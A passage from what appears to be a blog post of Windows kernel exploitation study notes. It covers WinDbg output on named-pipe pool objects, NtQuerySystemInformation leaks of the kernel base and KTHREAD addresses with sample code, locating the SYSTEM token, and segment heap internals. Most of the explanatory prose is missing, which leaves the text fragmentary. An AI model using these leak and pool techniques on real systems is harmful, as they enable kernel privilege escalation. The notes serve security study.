class="built_in">DebugBreak</span>();</span><br><span class="line"><span class="built_in">CloseHandle</span>(readPipe);</span><br><span class="line"><span class="built_in">CloseHandle</span>(writePipe);</span><br><span class="line"><span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>handleHandle</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; !handle <span class="number">0</span>xA4</span><br><span class="line"></span><br><span class="line">PROCESS ffff9a8824cbd080</span><br><span class="line"><span class="function">    SessionId: <span class="title">none</span>  <span class="title">Cid</span>: 0004    <span class="title">Peb</span>: 00000000  <span class="title">ParentCid</span>: 0000</span></span><br><span class="line"><span class="function">    <span class="title">DirBase</span>: 001<span class="title">ad000</span>  <span class="title">ObjectTable</span>: <span class="title">ffffc98328c04040</span>  <span class="title">HandleCount</span>: 2813.</span></span><br><span class="line"><span class="function">    <span class="title">Image</span>: <span class="title">System</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">Kernel</span> <span class="title">handle</span> <span class="title">table</span> <span class="title">at</span> <span class="title">ffffc98328c04040</span> <span class="title">with</span> 2813 <span class="title">entries</span> <span class="title">in</span> <span class="title">use</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">00<span class="title">a4</span>: <span class="title">Object</span>: <span class="title">ffff9a8826ffca20</span>  <span class="title">GrantedAccess</span>: 0012019<span class="title">f</span> (<span class="title">Protected</span>) (<span class="title">Inherit</span>) (<span class="title">Audit</span>) <span class="title">Entry</span>: <span class="title">ffffc98328cb2290</span></span></span><br><span class="line"><span class="function"><span class="title">Object</span>: <span class="title">ffff9a8826ffca20</span>  <span class="title">Type</span>: (<span class="title">ffff9a8824d1cae0</span>) <span class="title">File</span></span></span><br><span class="line"><span class="function">    <span class="title">ObjectHeader</span>: <span class="title">ffff9a8826ffc9f0</span> (<span class="title">new</span> <span class="title">version</span>)</span></span><br><span class="line"><span class="function">        <span class="title">HandleCount</span>: 1  <span class="title">PointerCount</span>: 32768</span></span><br><span class="line"><span class="function">        <span class="title">Directory</span> <span class="title">Object</span>: 00000000  <span class="title">Name</span>: \<span class="title">Device</span>\<span class="title">HarddiskVolume3</span>\$<span class="title">Extend</span>\$<span class="title">RmMetadata</span>\$<span class="title">TxfLog</span>\$<span class="title">TxfLog</span> &#123;<span class="title">clfs</span>&#125;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">0: <span class="title">kd</span>&gt; !<span class="title">pool</span> <span class="title">ffff9a8826ffca20</span> 2</span></span><br><span class="line"><span class="function"><span class="title">Pool</span> <span class="title">page</span> <span class="title">ffff9a8826ffca20</span> <span class="title">region</span> <span class="title">is</span> <span class="title">Nonpaged</span> <span class="title">pool</span></span></span><br><span class="line"><span class="function">*<span class="title">ffff9a8826ffc9a0</span> <span class="title">size</span>:  190 <span class="title">previous</span> <span class="title">size</span>:    0  (<span class="title">Allocated</span>) *<span class="title">File</span></span></span><br><span class="line"><span class="function"><span class="title">Pooltag</span> <span class="title">File</span> : <span class="title">File</span> <span class="title">objects</span></span></span><br></pre></td></tr></table></figure><p>NonPaged0x700x280x70</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; !poolused <span class="number">1</span> NpFr</span><br><span class="line">Using a machine size of <span class="number">1</span>ffe7f pages to configure the kd cache</span><br><span class="line">........</span><br><span class="line"> Sorting by Tag</span><br><span class="line"></span><br><span class="line">                            NonPaged                                         Paged</span><br><span class="line"> Tag       Allocs       Frees      Diff         Used       Allocs       Frees      Diff         Used</span><br><span class="line"></span><br><span class="line"> NpFr        <span class="number">2905</span>        <span class="number">2904</span>         <span class="number">1</span>          <span class="number">112</span>            <span class="number">0</span>           <span class="number">0</span>         <span class="number">0</span>            <span class="number">0</span>DATA_ENTRY records (read/write buffers) , Binary: npfs.sys</span><br><span class="line"></span><br><span class="line">TOTAL        <span class="number">2905</span>        <span class="number">2904</span>         <span class="number">1</span>          <span class="number">112</span>            <span class="number">0</span>           <span class="number">0</span>         <span class="number">0</span>            <span class="number">0</span></span><br></pre></td></tr></table></figure><p> 0x30 </p><ul><li>0xe0 &#x3D;&gt; 0x70 * 2</li><li>30x150 &#x3D; 0x70 * 3</li></ul><p><a href="https://learn.microsoft.com/zh-cn/windows-hardware/drivers/debuggercmds/-poolfind">poolfind (WinDbg)</a></p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; !poolfind NpFr -nonpaged</span><br></pre></td></tr></table></figure><h3 id="NtQuerySystemInformation"><a href="#NtQuerySystemInformation" class="headerlink" title="NtQuerySystemInformation"></a>NtQuerySystemInformation</h3><p> KASLR <code>ntdll.dll</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__kernel_entry NTSTATUS <span class="title">NtQuerySystemInformation</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]            SYSTEM_INFORMATION_CLASS SystemInformationClass,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in, out]       PVOID                    SystemInformation,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]            ULONG                    SystemInformationLength,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out, optional] PULONG                   ReturnLength</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>Windows<code>NtQuerySystemInformation</code></p><p><a href="https://github.com/sam-b/windows_kernel_address_leaks">windows_kernel_address_leaks</a></p><h4 id="SystemModuleInformation"><a href="#SystemModuleInformation" class="headerlink" title="SystemModuleInformation"></a>SystemModuleInformation</h4><p></p><p>from: <a href="https://h0mbre.github.io/HEVD_Stackoverflow_SMEP_Bypass_64bit/">HEVD Exploits</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">INT64 <span class="title">get_kernel_base</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;[&gt;] Getting kernel base address...&quot;</span> &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//https://github.com/koczkatamas/CVE-2016-0051/blob/master/EoP/Shellcode/Shellcode.cpp</span></span><br><span class="line">    <span class="comment">//also using the same import technique that @tekwizz123 showed us</span></span><br><span class="line"></span><br><span class="line">    PNtQuerySystemInformation NtQuerySystemInformation =</span><br><span class="line">        (PNtQuerySystemInformation)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandleA</span>(<span class="string">&quot;ntdll.dll&quot;</span>),</span><br><span class="line">            <span class="string">&quot;NtQuerySystemInformation&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!NtQuerySystemInformation) </span><br><span class="line">    &#123;</span><br><span class="line"></span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;[!] Failed to get the address of NtQuerySystemInformation.&quot;</span> &lt;&lt; endl;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;[!] Last error &quot;</span> &lt;&lt; <span class="built_in">GetLastError</span>() &lt;&lt; endl;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ULONG len = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">NtQuerySystemInformation</span>(SystemModuleInformation,</span><br><span class="line">        <span class="literal">NULL</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        &amp;len);</span><br><span class="line"></span><br><span class="line">    PSYSTEM_MODULE_INFORMATION pModuleInfo = (PSYSTEM_MODULE_INFORMATION)</span><br><span class="line">        <span class="built_in">VirtualAlloc</span>(<span class="literal">NULL</span>,</span><br><span class="line">            len,</span><br><span class="line">            MEM_RESERVE | MEM_COMMIT,</span><br><span class="line">            PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">    NTSTATUS status = <span class="built_in">NtQuerySystemInformation</span>(SystemModuleInformation,</span><br><span class="line">        pModuleInfo,</span><br><span class="line">        len,</span><br><span class="line">        &amp;len);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (status != (NTSTATUS)<span class="number">0x0</span>) </span><br><span class="line">    &#123;</span><br><span class="line">        cout &lt;&lt; <span class="string">&quot;[!] NtQuerySystemInformation failed!&quot;</span> &lt;&lt; endl;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    PVOID kernelImageBase = pModuleInfo-&gt;Modules[<span class="number">0</span>].ImageBaseAddress;</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;[&gt;] ntoskrnl.exe base address: 0x&quot;</span> &lt;&lt; hex &lt;&lt; kernelImageBase &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> (INT64)kernelImageBase;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Name <code>SYSTEM_MODULE_INFORMATION-&gt;Modules[ModulesCount].Name</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">SYSTEM_MODULE</span> &#123;</span><br><span class="line">ULONG                Reserved1;</span><br><span class="line">ULONG                Reserved2;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> _WIN64</span></span><br><span class="line">ULONGReserved3;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">PVOID                ImageBaseAddress;</span><br><span class="line">ULONG                ImageSize;</span><br><span class="line">ULONG                Flags;</span><br><span class="line">WORD                 Id;</span><br><span class="line">WORD                 Rank;</span><br><span class="line">WORD                 w018;</span><br><span class="line">WORD                 NameOffset;</span><br><span class="line">CHAR                 Name[MAXIMUM_FILENAME_LENGTH];</span><br><span class="line">&#125;SYSTEM_MODULE, *PSYSTEM_MODULE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">SYSTEM_MODULE_INFORMATION</span> &#123;</span><br><span class="line">ULONG                ModulesCount;</span><br><span class="line">SYSTEM_MODULE        Modules[<span class="number">1</span>];</span><br><span class="line">&#125; SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;</span><br></pre></td></tr></table></figure><h4 id="SystemExtendedHandleInformation"><a href="#SystemExtendedHandleInformation" class="headerlink" title="SystemExtendedHandleInformation"></a>SystemExtendedHandleInformation</h4><p>handle(<code>SYSTEM_HANDLE_INFORMATION_EX-&gt;Handles[HandleCount].UniqueProcessId</code>)Object</p><p>Handle</p><ul><li>ProcessHandleEPROCESS</li><li>ThreadHandle, ETHREAD<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_SYSTEM_HANDLE</span></span><br><span class="line">&#123;</span><br><span class="line">PVOID Object;</span><br><span class="line">HANDLE UniqueProcessId;</span><br><span class="line">HANDLE HandleValue;</span><br><span class="line">ULONG GrantedAccess;</span><br><span class="line">USHORT CreatorBackTraceIndex;</span><br><span class="line">USHORT ObjectTypeIndex;</span><br><span class="line">ULONG HandleAttributes;</span><br><span class="line">ULONG Reserved;</span><br><span class="line">&#125; SYSTEM_HANDLE, *PSYSTEM_HANDLE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_SYSTEM_HANDLE_INFORMATION_EX</span></span><br><span class="line">&#123;</span><br><span class="line">ULONG_PTR HandleCount;</span><br><span class="line">ULONG_PTR Reserved;</span><br><span class="line">SYSTEM_HANDLE Handles[<span class="number">1</span>];</span><br><span class="line">&#125; SYSTEM_HANDLE_INFORMATION_EX, *PSYSTEM_HANDLE_INFORMATION_EX;</span><br></pre></td></tr></table></figure></li></ul><p>pid4HandleValue4, objectSYSTEMEPROCESStoken</p><p>ETHREAD(KTHREAD) HandleValueThread</p><ul><li>ThreadOpenThread</li><li>ProcessCreateThread</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">HANDLE hThread = <span class="built_in">OpenThread</span>(THREAD_QUERY_INFORMATION, FALSE, <span class="built_in">GetCurrentThreadId</span>());</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> z = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; system_handle_info-&gt;NumberOfHandles; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> ((HANDLE)system_handle_info-&gt;Handles[i].HandleValue == hThread)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (system_handle_info-&gt;Handles[i].ObjectTypeIndex == ObjectThreadType)</span><br><span class="line">&#123;</span><br><span class="line">z++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> array_size = z - <span class="number">1</span>;</span><br><span class="line">PVOID* kThread_array = <span class="keyword">new</span> PVOID[array_size];</span><br><span class="line">z = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; system_handle_info-&gt;NumberOfHandles; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> ((HANDLE)system_handle_info-&gt;Handles[i].HandleValue == hThread)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (system_handle_info-&gt;Handles[i].ObjectTypeIndex == ObjectThreadType)</span><br><span class="line">&#123;</span><br><span class="line">kThread_array[z] = system_handle_info-&gt;Handles[i].Object;</span><br><span class="line">z++;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] KTHREAD address: %p\n&quot;</span>, kThread_array[array_size]);</span><br></pre></td></tr></table></figure><h3 id="Scoop-the-Windows-10-pool"><a href="#Scoop-the-Windows-10-pool" class="headerlink" title="Scoop the Windows 10 pool!"></a>Scoop the Windows 10 pool!</h3><p></p><p><a href="https://www.sstic.org/media/SSTIC2020/SSTIC-actes/pool_overflow_exploitation_since_windows_10_19h1/SSTIC2020-Article-pool_overflow_exploitation_since_windows_10_19h1-bayet_fariello.pdf">SSTIC2020-Article-pool_overflow_exploitation_since_windows_10_19h1</a></p><p><a href="https://ghostasky.github.io/posts/2023-8-scoopthewindows10pool/">Scoop The Windows 10 Pool </a></p><p><a href="https://ashlq.github.io/2023/08/22/Windows10%E5%86%85%E6%A0%B8%E6%B1%A0%E7%AE%A1%E7%90%86%E6%9C%BA%E5%88%B6%E4%B8%8E%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/">Windows10 | Ash blog (ashlq.github.io)</a></p><p><a href="https://xz.aliyun.com/t/13434?time__1311=mqmxnDBQqQq2D/D0Dx2DUEFxciD9WGrGYD">Windows</a></p><h4 id="pool"><a href="#pool" class="headerlink" title="pool"></a>pool</h4><p> <code>C\Windows\system32\ntdll.dll</code> </p><p>win10 2004Win10 202020H1 </p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">PVOID <span class="title">ExAllocatePoolWithTag</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] __drv_strictTypeMatch(__drv_typeExpr)POOL_TYPE PoolType,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] SIZE_T                                         NumberOfBytes,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in] ULONG                                          Tag</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure><p>,<strong></strong>POOL_HEADERtag</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// win10 22h2</span></span><br><span class="line"><span class="number">1</span>: kd&gt; dt nt!_POOL_HEADER</span><br><span class="line">   +<span class="number">0x000</span> PreviousSize     : Pos <span class="number">0</span>, <span class="number">8</span> Bits</span><br><span class="line">   +<span class="number">0x000</span> PoolIndex        : Pos <span class="number">8</span>, <span class="number">8</span> Bits</span><br><span class="line">   +<span class="number">0x002</span> BlockSize        : Pos <span class="number">0</span>, <span class="number">8</span> Bits</span><br><span class="line">   +<span class="number">0x002</span> PoolType         : Pos <span class="number">8</span>, <span class="number">8</span> Bits</span><br><span class="line">   +<span class="number">0x000</span> Ulong1           : Uint4B</span><br><span class="line">   +<span class="number">0x004</span> PoolTag          : Uint4B</span><br><span class="line">   +<span class="number">0x008</span> ProcessBilled    : Ptr64 _EPROCESS</span><br><span class="line">   +<span class="number">0x008</span> AllocatorBackTraceIndex : Uint2B</span><br><span class="line">   +<span class="number">0x00a</span> PoolTagHash      : Uint2B</span><br></pre></td></tr></table></figure><p>PoolType:NonPagedPool,PagedPool,SessionPool,NonPagedPoolNx</p><ul><li>win8NonPagedPoolNx,NonpagedPool.</li></ul><p><strong>PagedPool</strong></p><ul><li></li></ul><p><strong>NonPagedPool</strong></p><p>Segment Heap  Windows 10 19H1  </p><p>win10Segment heapNT heapsegment heapwinapp </p><p>Frontend HeapBackend Heap</p><p>(LFH)  &lt;&#x3D; 0x200<br>(VS)  &lt;&#x3D; 0x20000<br>(SEG)  &lt;&#x3D; 0x7f0000<br>Large</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">RtlpHpAllocateHeapInternal</span><span class="params">(__int64 a1, __int64 a2, <span class="type">unsigned</span> __int64 a3, <span class="type">unsigned</span> <span class="type">int</span> a4, <span class="type">int</span> *a5)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v7; <span class="comment">// rsi</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// ebp</span></span><br><span class="line">  __int64 v10; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v11; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v6 = a3;</span><br><span class="line">  v7 = a2;</span><br><span class="line">  v9 = <span class="number">3</span>;</span><br><span class="line">  <span class="keyword">if</span> ( a3 &gt; (<span class="type">unsigned</span> <span class="type">int</span>)*(<span class="type">unsigned</span> __int16 *)(a1 + <span class="number">892</span>) - <span class="number">16</span></span><br><span class="line">    || (v10 = <span class="built_in">RtlpHpLfhContextAllocate</span>(a1 + <span class="number">832</span>, a2, a3, a4), a3 = (<span class="type">unsigned</span> <span class="type">int</span>)v6, a2 = (<span class="type">unsigned</span> <span class="type">int</span>)v7, v10 == <span class="number">-1</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v6 &gt; <span class="number">0x20000</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v6 &gt; *(<span class="type">unsigned</span> <span class="type">int</span> *)(a1 + <span class="number">464</span>) )</span><br><span class="line">        v11 = <span class="built_in">RtlpHpLargeAlloc</span>(a1, v7, v6, a4);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        v11 = <span class="built_in">RtlpHpSegAlloc</span>((<span class="type">unsigned</span> <span class="type">int</span>)a1 + (*(<span class="type">unsigned</span> <span class="type">int</span> *)(a1 + <span class="number">272</span>) &lt; v6 ? <span class="number">448</span> : <span class="number">256</span>), v7, v6, v6, a4);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      v11 = <span class="built_in">RtlpHpVsContextAllocate</span>(a1 + <span class="number">640</span>, a2, a3, a4);</span><br><span class="line">    &#125;</span><br><span class="line">    v10 = v11;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v9 = <span class="number">2</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  *a5 = v9;</span><br><span class="line">  <span class="keyword">return</span> v10;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>LFH,VS,SEG(CONTEXT)<code>_SEGMENT_HEAP</code>0x100,0x280,0x340</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; dt nt!_SEGMENT_HEAP</span><br><span class="line">   +<span class="number">0x000</span> EnvHandle        : RTL_HP_ENV_HANDLE</span><br><span class="line">   +<span class="number">0x010</span> Signature        : Uint4B</span><br><span class="line">   +<span class="number">0x014</span> GlobalFlags      : Uint4B</span><br><span class="line">   +<span class="number">0x018</span> Interceptor      : Uint4B</span><br><span class="line">   +<span class="number">0x01c</span> ProcessHeapListIndex : Uint2B</span><br><span class="line">   +<span class="number">0x01e</span> AllocatedFromMetadata : Pos <span class="number">0</span>, <span class="number">1</span> Bit</span><br><span class="line">   +<span class="number">0x020</span> CommitLimitData  : _RTL_HEAP_MEMORY_LIMIT_DATA</span><br><span class="line">   +<span class="number">0x020</span> ReservedMustBeZero1 : Uint8B</span><br><span class="line">   +<span class="number">0x028</span> UserContext      : Ptr64 Void</span><br><span class="line">   +<span class="number">0x030</span> ReservedMustBeZero2 : Uint8B</span><br><span class="line">   +<span class="number">0x038</span> Spare            : Ptr64 Void</span><br><span class="line">   +<span class="number">0x040</span> LargeMetadataLock : Uint8B</span><br><span class="line">   +<span class="number">0x048</span> LargeAllocMetadata : _RTL_RB_TREE</span><br><span class="line">   +<span class="number">0x058</span> LargeReservedPages : Uint8B</span><br><span class="line">   +<span class="number">0x060</span> LargeCommittedPages : Uint8B</span><br><span class="line">   +<span class="number">0x068</span> StackTraceInitVar : _RTL_RUN_ONCE</span><br><span class="line">   +<span class="number">0x080</span> MemStats         : _HEAP_RUNTIME_MEMORY_STATS</span><br><span class="line">   +<span class="number">0x0d8</span> GlobalLockCount  : Uint2B</span><br><span class="line">   +<span class="number">0x0dc</span> GlobalLockOwner  : Uint4B</span><br><span class="line">   +<span class="number">0x0e0</span> ContextExtendLock : Uint8B</span><br><span class="line">   +<span class="number">0x0e8</span> AllocatedBase    : Ptr64 UChar</span><br><span class="line">   +<span class="number">0x0f0</span> UncommittedBase  : Ptr64 UChar</span><br><span class="line">   +<span class="number">0x0f8</span> ReservedLimit    : Ptr64 UChar</span><br><span class="line">   +<span class="number">0x100</span> SegContexts      : [<span class="number">2</span>] _HEAP_SEG_CONTEXT</span><br><span class="line">   +<span class="number">0x280</span> VsContext        : _HEAP_VS_CONTEXT</span><br><span class="line">   +<span class="number">0x340</span> LfhContext       : _HEAP_LFH_CONTEXT</span><br></pre></td></tr></table></figure><p><code>POOL_TYPE</code>,1<code>_SEGMENT_HEAP</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; dt _POOL_TYPE</span><br><span class="line">ntdll!_POOL_TYPE</span><br><span class="line">   NonPagedPool = <span class="number">0</span>n0</span><br><span class="line">   NonPagedPoolExecute = <span class="number">0</span>n0</span><br><span class="line">   PagedPool = <span class="number">0</span>n1</span><br><span class="line">   NonPagedPoolMustSucceed = <span class="number">0</span>n2</span><br><span class="line">   DontUseThisType = <span class="number">0</span>n3</span><br><span class="line">   NonPagedPoolCacheAligned = <span class="number">0</span>n4</span><br><span class="line">   PagedPoolCacheAligned = <span class="number">0</span>n5</span><br><span class="line">   NonPagedPoolCacheAlignedMustS = <span class="number">0</span>n6</span><br><span class="line">   MaxPoolType = <span class="number">0</span>n7</span><br><span class="line">   NonPagedPoolBase = <span class="number">0</span>n0</span><br><span class="line">   NonPagedPoolBaseMustSucceed = <span class="number">0</span>n2</span><br><span class="line">   